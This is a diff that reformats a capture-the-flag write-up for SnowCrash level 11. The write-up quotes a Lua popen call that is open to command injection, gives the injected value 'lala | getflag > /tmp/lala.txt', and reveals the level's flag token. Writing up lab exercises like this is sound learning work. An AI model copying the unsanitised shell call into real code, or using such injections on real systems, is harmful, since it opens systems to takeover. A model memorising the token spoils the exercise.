@@ -1,16 +1,19 @@
-This one was quite simple, we get a .lua file that we extract to read it.
-After a little bit of time, we saw that 
-  prog = io.popen("echo "..pass.." | sha1sum", "r")
-  data = prog:read("*all")
-was not very secure. 
+# SnowCrash Level 11
 
-So we tried to inject some commands here : lala | getflag > /tmp/lala.txt
+## Introduction
+This one was quite simple. We received a .lua file that we extracted to read its contents. After a little bit of time, we noticed that the following code snippet was not very secure:
+```
+prog = io.popen("echo "..pass.." | sha1sum", "r")
+data = prog:read("*all")
+```
+## Exploitation
+Realizing the potential vulnerability, we attempted to inject some commands here: lala | getflag > /tmp/lala.txt.
 
-This gave us the token : fa6v5ateaw21peobuub8ipe6s
+This simple injection provided us with the token: fa6v5ateaw21peobuub8ipe6s.
 
-/*********************************************************\
-
+## Obtaining the Token
+After successfully injecting the command and retrieving the token, we executed getflag:
+```
 flag11@SnowCrash:~$ getflag 
-Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
-
-\*********************************************************/
+Check flag. Here is your token: fa6v5ateaw21peobuub8ipe6s
+```
